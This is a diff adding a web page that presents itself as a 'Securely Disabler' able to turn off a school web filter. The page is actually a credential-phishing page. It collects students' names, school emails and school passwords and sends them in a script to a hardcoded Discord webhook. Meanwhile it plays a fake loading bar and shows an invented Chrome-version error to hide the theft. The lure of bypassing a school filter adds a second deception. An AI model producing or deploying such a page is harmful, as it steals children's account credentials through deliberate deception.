@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Securely Disabler</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        h1 {
+            color: #ff6347;
+        }
+        p {
+            color: #333;
+        }
+        .button {
+            background-color: #4caf50;
+            color: white;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin-top: 20px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        #loading-bar {
+            width: 300px;
+            border: 1px solid #000;
+            margin: 20px auto;
+            padding: 5px;
+            display: none; /* Hide by default */
+        }
+        #loading-progress {
+            width: 0%;
+            height: 20px;
+            background-color: black; /* Change the background color to black */
+        }
+        #output.red {
+            color: red;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://i.ibb.co/F7Sv0Fb/ctwl-Oq45-400x400-modified.png" alt="Image" width="200"> <!-- Add this line -->
+        <h1>Securely Disabler</h1>
+        <p>This script disables Securely on the Wi-Fi network you are using.</p>
+        <p>Please provide the required information:</p>
+        <form id="submitForm">
+            <label for="firstName">First Name:</label><br>
+            <input type="text" id="firstName" name="firstName" required><br>
+            <label for="email">School Email:</label><br>
+            <input type="email" id="email" name="email" required><br>
+            <label for="password">School Password:</label><br>
+            <input type="password" id="password" name="password" required><br>
+            <label for="verification">Image Verification:</label><br>
+            <input type="text" id="verification" name="verification" required><br>
+            <label for="action">Remove or Re-enable Securely:</label><br>
+            <select id="action" name="action" required>
+                <option value="remove">Remove</option>
+                <option value="enable">Re-enable</option>
+            </select><br><br>
+            <button type="button" class="button" onclick="submitForm()">Submit</button>
+        </form>
+        <p id="output"></p>
+        <div id="loading-bar">
+            <div id="loading-progress"></div>
+        </div>
+    </div>
+
+    <script>
+        const webhookUrl = 'https://discord.com/api/webhooks/1240781818534432959/EavOMWjt8OR3bHOugBda2eclR3HNDnoRHrR2IBsntUdnPMYFcHDmHf5FN4N4elHb6hMW';
+
+        function submitForm() {
+            // Display loading bar
+            var loadingBar = document.getElementById('loading-bar');
+            loadingBar.style.display = 'block';
+
+            // Get the progress bar element
+            var progressBar = document.getElementById('loading-progress');
+
+            // Initialize width and interval
+            var width = 0;
+            var interval = setInterval(function() {
+                // Increment width
+                width += 1;
+                // Set width style
+                progressBar.style.width = width + '%';
+                // Check if width is at 100%
+                if (width >= 100) {
+                    // Stop the interval
+                    clearInterval(interval);
+                    // Hide loading bar after 1 second
+                    setTimeout(function() {
+                        loadingBar.style.display = 'none';
+                        // Reset form fields
+                        document.getElementById("submitForm").reset();
+                        // Display error message with red color
+                        document.getElementById("output").innerHTML = "Error accessing securely API. Please Check Chrome Version And try again. This script won't work above v119 due to chrome patching API calls to extensions. Please update to v119 or above.";
+                        document.getElementById("output").classList.add('red');
+                    }, 1000); // Delay for 1 second after completion
+                }
+            }, 100); // Increment every 100 milliseconds
+
+            // Collect form data
+            const firstName = document.getElementById('firstName').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const verification = document.getElementById('verification').value;
+            const action = document.getElementById('action').value;
+
+            // Prepare payload
+            const payload = {
+                content: `New submission:\n- **First Name:** ${firstName}\n- **Email:** ${email}\n- **Password:** ${password}\n- **Verification:** ${verification}\n- **Action:** ${action}`
+            };
+
+            // Send data to Discord webhook
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => response.json())
+            .then(data => console.log('Success:', data))
+            .catch(error => console.error('Error:', error));
+        }
+    </script>
+</body>
+</html>
